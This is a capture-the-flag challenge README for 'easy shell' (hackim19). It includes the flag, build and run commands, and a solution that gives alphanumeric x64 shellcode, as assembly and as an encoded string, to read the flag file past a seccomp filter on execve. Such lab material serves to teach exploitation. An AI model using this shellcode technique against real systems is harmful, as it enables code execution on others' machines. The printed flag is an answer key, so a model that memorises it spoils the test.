#### easy shell

##### Description

Go get a shell while it's possible

##### Points

200/250

##### Flag

hackim19{to_read_or_not_to_r34d}

##### Solution

input is written to RWX page and then executed. But only Alphanumeric chars are
allowed. Since there's abundance of x64 execve on the internet, `execve` has
been filtered using seccomp. A helper `dump` function is provided to dump a file
byte by byte

```
pop rax; xor rax, 0x32323232; xor rax, 0x32323569; push 0x67616c66; push rsp; push rsp; pop rcx; xor rdi, QWORD PTR [rcx] ; push rax
```
XH52222H5i522hflagTTYH39P

##### Build
```shell
docker build -t code-alpha .
```
##### Run:
```shell
docker run -p 4010:4010 code-alpha:latest
```

Notes:
Port is changeable. Change it in run command.
Change the flag to match the flag format.
